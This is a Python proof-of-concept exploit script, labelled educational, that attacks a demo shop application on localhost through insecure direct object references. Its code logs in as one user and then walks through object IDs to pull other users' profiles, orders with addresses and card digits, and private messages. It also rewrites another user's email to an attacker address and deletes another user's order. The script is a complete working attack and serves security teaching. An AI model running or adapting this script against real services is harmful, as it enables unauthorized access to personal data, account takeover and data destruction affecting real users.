"""
IDOR Exploit Script - Proof of Concept
Demonstrates exploitation of IDOR vulnerabilities in the SecureShop application.
For educational purposes only.
"""

import requests
import json
import sys
from datetime import datetime

# Configuration
BASE_URL = "http://localhost:5000"
ATTACKER_USERNAME = "alice"
ATTACKER_PASSWORD = "password123"

# Color codes for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"


def banner():
    """Display exploit banner."""
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║                  IDOR EXPLOIT - POC                         ║
║          Insecure Direct Object Reference                   ║
║                                                              ║
║  Target: SecureShop Web Application                         ║
║  Author: Security Research Project                          ║
║  Purpose: Educational Demonstration Only                    ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")


def log_info(msg):
    print(f"{BLUE}[INFO]{RESET} {msg}")


def log_success(msg):
    print(f"{GREEN}[SUCCESS]{RESET} {msg}")


def log_attack(msg):
    print(f"{RED}[EXPLOIT]{RESET} {msg}")


def log_data(msg):
    print(f"{YELLOW}[DATA]{RESET} {msg}")


def log_step(step, msg):
    print(f"\n{CYAN}{BOLD}{'='*60}")
    print(f"  Step {step}: {msg}")
    print(f"{'='*60}{RESET}\n")


def authenticate(session):
    """Authenticate as the attacker user."""
    log_info(f"Authenticating as '{ATTACKER_USERNAME}'...")

    response = session.post(f"{BASE_URL}/login", data={
        "username": ATTACKER_USERNAME,
        "password": ATTACKER_PASSWORD
    }, allow_redirects=False)

    if response.status_code in [302, 200]:
        log_success(f"Authenticated successfully as '{ATTACKER_USERNAME}' (User ID: 1)")
        return True
    else:
        print(f"{RED}[FAIL] Authentication failed!{RESET}")
        return False


def exploit_1_profile_enumeration(session):
    """Exploit 1: Enumerate all user profiles via IDOR."""
    log_step(1, "Profile Enumeration via IDOR")
    log_attack("Attempting to access profiles of ALL users by changing user_id parameter...")
    print(f"  {YELLOW}Legitimate request: GET /api/user/1 (own profile){RESET}")
    print(f"  {RED}Malicious request: GET /api/user/2, /api/user/3, /api/user/4 ...{RESET}\n")

    leaked_users = []
    for user_id in range(1, 10):
        response = session.get(f"{BASE_URL}/api/user/{user_id}")

        if response.status_code == 200:
            user_data = response.json()
            leaked_users.append(user_data)
            log_data(f"User ID {user_id}: {json.dumps(user_data, indent=2)}")
        elif response.status_code == 404:
            log_info(f"User ID {user_id}: Not found (end of enumeration)")
            break

    print(f"\n  {GREEN}{BOLD}Result: Leaked {len(leaked_users)} user profiles!{RESET}")
    print(f"  {GREEN}Exposed data: usernames, emails, full names, phone numbers, roles{RESET}")
    return leaked_users


def exploit_2_order_data_theft(session):
    """Exploit 2: Access other users' order data including payment info."""
    log_step(2, "Order Data Theft via IDOR")
    log_attack("Accessing order history of ALL users...")
    print(f"  {YELLOW}Legitimate request: GET /api/orders/1 (own orders){RESET}")
    print(f"  {RED}Malicious request: GET /api/orders/2, /api/orders/3, /api/orders/4 ...{RESET}\n")

    all_orders = []
    for user_id in range(1, 5):
        response = session.get(f"{BASE_URL}/api/orders/{user_id}")

        if response.status_code == 200:
            orders = response.json()
            if orders:
                all_orders.extend(orders)
                log_data(f"User ID {user_id} - Found {len(orders)} orders:")
                for order in orders:
                    print(f"    Order #{order['id']}: {order['product']} | "
                          f"₪{order['total_price']} | "
                          f"Address: {order['shipping_address']} | "
                          f"Card: ****{order['credit_card_last4']}")

    print(f"\n  {GREEN}{BOLD}Result: Leaked {len(all_orders)} orders from all users!{RESET}")
    print(f"  {GREEN}Exposed data: products, prices, shipping addresses, credit card info{RESET}")
    return all_orders


def exploit_3_message_reading(session):
    """Exploit 3: Read private messages of other users."""
    log_step(3, "Private Message Reading via IDOR")
    log_attack("Reading private messages by iterating message IDs...")
    print(f"  {YELLOW}Legitimate request: GET /api/messages/1 (own message){RESET}")
    print(f"  {RED}Malicious request: GET /api/messages/2, /api/messages/3 ...{RESET}\n")

    leaked_messages = []
    for msg_id in range(1, 10):
        response = session.get(f"{BASE_URL}/api/messages/{msg_id}")

        if response.status_code == 200:
            msg = response.json()
            leaked_messages.append(msg)
            log_data(f"Message #{msg_id}: From User #{msg['sender_id']} → "
                     f"To User #{msg['receiver_id']}")
            print(f"    Subject: {msg['subject']}")
            print(f"    Body: {msg['body']}")
        elif response.status_code == 404:
            break

    print(f"\n  {GREEN}{BOLD}Result: Leaked {len(leaked_messages)} private messages!{RESET}")
    return leaked_messages


def exploit_4_profile_modification(session):
    """Exploit 4: Modify another user's profile data."""
    log_step(4, "Profile Modification via IDOR")
    log_attack("Attempting to modify Bob's profile (User ID: 2)...")
    print(f"  {YELLOW}Legitimate request: PUT /api/user/1 (own profile){RESET}")
    print(f"  {RED}Malicious request: PUT /api/user/2 (Bob's profile){RESET}\n")

    # First, show original data
    response = session.get(f"{BASE_URL}/api/user/2")
    original = response.json()
    log_info(f"Original email for Bob: {original['email']}")

    # Modify Bob's email
    malicious_data = {
        "email": "hacked_bob@evil.com",
        "phone": "000-0000000"
    }

    response = session.put(
        f"{BASE_URL}/api/user/2",
        json=malicious_data,
        headers={"Content-Type": "application/json"}
    )

    if response.status_code == 200:
        modified = response.json()
        log_success(f"Successfully modified Bob's profile!")
        log_data(f"New email: {modified['user']['email']}")
        log_data(f"New phone: {modified['user']['phone']}")

        # Restore original data
        session.put(
            f"{BASE_URL}/api/user/2",
            json={"email": "bob@example.com", "phone": "052-9876543"},
            headers={"Content-Type": "application/json"}
        )
        log_info("(Restored original data for demo purposes)")

    print(f"\n  {GREEN}{BOLD}Result: Successfully modified another user's profile!{RESET}")
    print(f"  {GREEN}Impact: Account takeover potential via email change{RESET}")


def exploit_5_order_deletion(session):
    """Exploit 5: Delete another user's order."""
    log_step(5, "Order Deletion via IDOR")
    log_attack("Attempting to delete Bob's order (Order ID: 3)...")
    print(f"  {YELLOW}Legitimate request: DELETE /api/orders/1 (own order){RESET}")
    print(f"  {RED}Malicious request: DELETE /api/orders/3 (Bob's order){RESET}\n")

    # Show the order exists
    response = session.get(f"{BASE_URL}/api/orders/2")
    if response.status_code == 200:
        orders = response.json()
        log_info(f"Bob currently has {len(orders)} orders")

    # Delete Bob's order
    response = session.delete(f"{BASE_URL}/api/orders/3")
    if response.status_code == 200:
        result = response.json()
        log_success(f"Server response: {result['message']}")

    # Show the order is gone
    response = session.get(f"{BASE_URL}/api/orders/2")
    if response.status_code == 200:
        orders = response.json()
        log_info(f"Bob now has {len(orders)} orders (one was deleted!)")

    print(f"\n  {GREEN}{BOLD}Result: Successfully deleted another user's order!{RESET}")
    print(f"  {GREEN}Impact: Data destruction, business disruption{RESET}")


def generate_report(leaked_users, leaked_orders, leaked_messages):
    """Generate a summary report of the exploit results."""
    log_step(6, "Exploit Summary Report")

    print(f"""
{BOLD}╔══════════════════════════════════════════════════════════════╗
║                    EXPLOIT SUMMARY REPORT                    ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Attacker:     alice (User ID: 1, Role: user)               ║
║  Target:       SecureShop Web Application                    ║
║  Timestamp:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                       ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  VULNERABILITIES EXPLOITED:                                  ║
║                                                              ║
║  1. Horizontal IDOR - Profile Enumeration                   ║
║     → Leaked {len(leaked_users)} user profiles (PII data)                  ║
║                                                              ║
║  2. Horizontal IDOR - Order Data Theft                      ║
║     → Leaked {len(leaked_orders)} orders (payment + address data)           ║
║                                                              ║
║  3. Horizontal IDOR - Private Message Reading               ║
║     → Leaked {len(leaked_messages)} private messages                        ║
║                                                              ║
║  4. Object-Level IDOR - Profile Modification                ║
║     → Modified another user's email & phone                 ║
║                                                              ║
║  5. Object-Level IDOR - Order Deletion                      ║
║     → Deleted another user's order                          ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  IMPACT ASSESSMENT:                                          ║
║                                                              ║
║  Confidentiality: HIGH - All user data exposed              ║
║  Integrity:       HIGH - User data can be modified          ║
║  Availability:    MEDIUM - Orders can be deleted            ║
║  CVSS Score:      8.6 (High)                                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")


def main():
    """Main exploit execution."""
    banner()

    # Create session (maintains cookies)
    session = requests.Session()

    # Step 0: Authenticate
    log_step(0, "Authentication")
    if not authenticate(session):
        sys.exit(1)

    # Execute exploits
    leaked_users = exploit_1_profile_enumeration(session)
    leaked_orders = exploit_2_order_data_theft(session)
    leaked_messages = exploit_3_message_reading(session)
    exploit_4_profile_modification(session)
    exploit_5_order_deletion(session)

    # Generate report
    generate_report(leaked_users, leaked_orders, leaked_messages)

    print(f"\n{GREEN}{BOLD}[*] All IDOR exploits completed successfully!{RESET}")
    print(f"{YELLOW}[*] This demonstrates why proper authorization checks are critical.{RESET}\n")


if __name__ == '__main__':
    main()
